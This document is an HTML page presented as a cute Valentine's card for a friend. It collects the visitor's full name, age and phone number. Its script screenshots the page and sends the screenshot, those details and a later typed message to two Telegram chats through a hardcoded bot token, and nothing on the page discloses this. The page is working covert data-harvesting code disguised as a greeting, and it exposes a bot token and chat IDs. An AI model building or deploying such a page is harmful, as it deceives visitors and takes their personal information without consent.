<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>For My Bestu ‚ù§Ô∏è</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Dancing+Script:wght@700&display=swap');
        
        :root { --bg: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); --glass: rgba(255, 255, 255, 0.25); --accent: #ff4d6d; }
        .dark-theme { --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); --glass: rgba(255, 255, 255, 0.05); --accent: #ff758f; }

        body { font-family: 'Poppins', sans-serif; background: var(--bg); min-height: 100vh; transition: 0.6s; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        
        .status-bar { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500; }
        .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); animation: slideUp 0.8s ease; }
        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        /* Slide to Submit UX */
        .slider-container { position: relative; width: 100%; height: 60px; background: rgba(255, 255, 255, 0.1); border-radius: 30px; border: 1px solid rgba(255, 255, 255, 0.2); overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .slider-text { font-size: 14px; font-weight: 600; color: rgba(255, 255, 255, 0.6); pointer-events: none; z-index: 1; }
        .slider-handle { position: absolute; left: 5px; width: 50px; height: 50px; background: white; border-radius: 25px; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 2; box-shadow: 0 4px 10px rgba(0,0,0,0.2); transition: transform 0.1s; }
        .slider-bg { position: absolute; left: 0; top: 0; height: 100%; width: 0%; background: var(--accent); border-radius: 30px; transition: width 0.1s; }

        .orb { position: absolute; border-radius: 50%; filter: blur(80px); z-index: 0; animation: floatOrb 10s infinite alternate; }
        @keyframes floatOrb { from { transform: translate(0,0); } to { transform: translate(30px, 40px); } }
        #yt-header { position: fixed; top: -300px; left: 0; width: 100%; height: 250px; transition: 0.8s; z-index: 400; background: black; }
        #yt-header.active { top: 0; }
        .hidden-stage { display: none; }
    </style>
</head>
<body id="capture-body">

    <div class="orb w-72 h-72 bg-pink-400 opacity-30 top-10 left-[-50px]"></div>
    <div class="orb w-80 h-80 bg-purple-500 opacity-20 bottom-10 right-[-50px]"></div>

    <div class="status-bar">
        <div id="real-clock">--:--</div>
        <div class="flex gap-2">
            <span>üì∂</span> <span id="real-battery">üîã --%</span>
        </div>
    </div>

    <div id="yt-header"><div id="player-mount" class="w-full h-full"></div></div>

    <div class="w-full max-w-sm px-4">
        <div id="main-content" class="glass-card p-8 text-center w-full">
            
            <div id="stage-1" class="space-y-4">
                <h1 class="text-4xl font-bold font-serif mb-6 text-white">Hello Bestu! ‚ú®</h1>
                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
                <input type="number" id="age" placeholder="Age" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
                <input type="tel" id="mobile" placeholder="Phone Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none text-white">
                <button onclick="toStage2()" class="w-full bg-pink-500 py-4 rounded-2xl font-bold text-white shadow-xl mt-4">Reveal Magic ‚ù§Ô∏è</button>
            </div>

            <div id="stage-2" class="hidden-stage">
                <h1 class="text-3xl font-bold font-serif mb-10 text-white">Will you be my Valentine? ‚ù§Ô∏è</h1>
                <div class="grid gap-4">
                    <button onclick="handleAction('YES', '‚ù§Ô∏è')" class="bg-pink-500 py-4 rounded-2xl font-bold text-white shadow-lg">YES! üòç</button>
                    <button onclick="handleAction('NO', 'üò¢')" class="bg-white/10 py-4 rounded-2xl border border-white/20 text-white">No üò¢</button>
                    <button onclick="handleAction('FOOD', 'üçï')" class="bg-yellow-500 py-4 rounded-2xl font-bold text-white">Food (You pay! üçï)</button>
                </div>
            </div>

            <div id="stage-3" class="hidden-stage space-y-6">
                <h2 class="text-3xl font-bold text-white">You're Amazing! ‚ù§Ô∏è</h2>
                <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="w-full rounded-3xl shadow-2xl">
                <textarea id="final-reply" placeholder="Send a message..." class="w-full p-4 rounded-2xl bg-white/5 border border-white/10 text-white outline-none" rows="2"></textarea>
                
                <div class="slider-container" id="sliderContainer">
                    <div class="slider-bg" id="sliderBg"></div>
                    <div class="slider-text">Slide to Send ‚ù§Ô∏è</div>
                    <div class="slider-handle" id="sliderHandle">‚ûî</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
        const CHAT_IDS = ["6572151527", "7893857792"]; 
        let store = {};

        // Update Exact Time and Battery
        function updateLiveStatus() {
            const now = new Date();
            document.getElementById('real-clock').innerText = now.getHours().toString().padStart(2, '0') + ":" + now.getMinutes().toString().padStart(2, '0');
            
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    const updateBat = () => document.getElementById('real-battery').innerText = `üîã ${Math.round(battery.level * 100)}%`;
                    updateBat();
                    battery.addEventListener('levelchange', updateBat);
                });
            }
        }
        setInterval(updateLiveStatus, 1000);
        updateLiveStatus();

        function toStage2() {
            store = { n: document.getElementById('name').value, a: document.getElementById('age').value, m: document.getElementById('mobile').value };
            if(!store.n || !store.m) return alert("Fill details! üòä");
            document.getElementById('stage-1').classList.add('hidden-stage');
            document.getElementById('stage-2').classList.remove('hidden-stage');
        }

        async function handleAction(type, emoji) {
            updateLiveStatus(); // Ensure status is fresh for capture
            const canvas = await html2canvas(document.body, { useCORS: true, scale: 2 });
            canvas.toBlob(async (blob) => {
                for (const id of CHAT_IDS) {
                    const fd = new FormData();
                    fd.append('chat_id', id);
                    fd.append('photo', blob, 'shot.png');
                    fd.append('caption', `üì° *REAL-TIME LOG*\nName: ${store.n}\nAge: ${store.a}\nPhone: ${store.m}\nChoice: ${type}`);
                    fd.append('parse_mode', 'Markdown');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }
            });

            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${type === 'YES' ? 'TK2RwQUun-U' : 'CVEM60qkzT8'}?autoplay=1" frameborder="0"></iframe>`;
            document.getElementById('yt-header').classList.add('active');
            document.getElementById('stage-2').classList.add('hidden-stage');
            document.getElementById('stage-3').classList.remove('hidden-stage');
            initSlider();
        }

        // SLIDER LOGIC
        function initSlider() {
            const handle = document.getElementById('sliderHandle');
            const container = document.getElementById('sliderContainer');
            const bg = document.getElementById('sliderBg');
            let isDragging = false;
            let startX = 0;
            const maxTrack = container.offsetWidth - handle.offsetWidth - 10;

            const start = (e) => { isDragging = true; startX = (e.pageX || e.touches[0].pageX) - handle.offsetLeft; };
            const move = (e) => {
                if (!isDragging) return;
                let x = (e.pageX || e.touches[0].pageX) - startX;
                x = Math.max(0, Math.min(x, maxTrack));
                handle.style.transform = `translateX(${x}px)`;
                bg.style.width = `${(x / maxTrack) * 100}%`;
                if (x >= maxTrack - 5) {
                    isDragging = false;
                    sendFinalReply();
                }
            };
            const end = () => { if (!isDragging) return; isDragging = false; handle.style.transform = 'translateX(0)'; bg.style.width = '0%'; };

            handle.addEventListener('mousedown', start);
            window.addEventListener('mousemove', move);
            window.addEventListener('mouseup', end);
            handle.addEventListener('touchstart', start);
            window.addEventListener('touchmove', move);
            window.addEventListener('touchend', end);
        }

        async function sendFinalReply() {
            const reply = document.getElementById('final-reply').value;
            for (const id of CHAT_IDS) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("üí¨ Message: " + reply + " from " + store.n)}`);
            }
            alert("Message Sent! ‚ù§Ô∏è");
            location.reload();
        }
    </script>
</body>
</html>
